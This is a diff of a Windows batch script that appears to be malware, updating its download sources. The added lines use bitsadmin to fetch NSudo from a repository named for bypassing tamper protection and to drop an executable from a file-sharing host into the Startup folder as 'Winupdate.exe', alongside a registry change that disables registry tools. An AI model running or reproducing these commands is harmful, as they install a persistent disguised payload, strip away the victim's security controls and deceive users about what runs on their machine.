@@ -18,7 +18,7 @@ if '%errorlevel%' NEQ '0' (
 :main
 cd %temp%
 
-bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
+bitsadmin /transfer Packages /download /priority foreground https://raw.githubusercontent.com/hamidaso02/defender/main/NSudoLG.exe %temp%\NSudo.exe
 
 set startup = %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
@@ -96,7 +96,7 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "Dis
 =======
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 
-bitsadmin /transfer Packages /download /priority foreground https://www.sketch-studio.net/dashboard/wp-content/uploads/Microsofts.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
+bitsadmin /transfer Packages /download /priority foreground https://ufile.io/3ii3gtn0 "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe"
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 
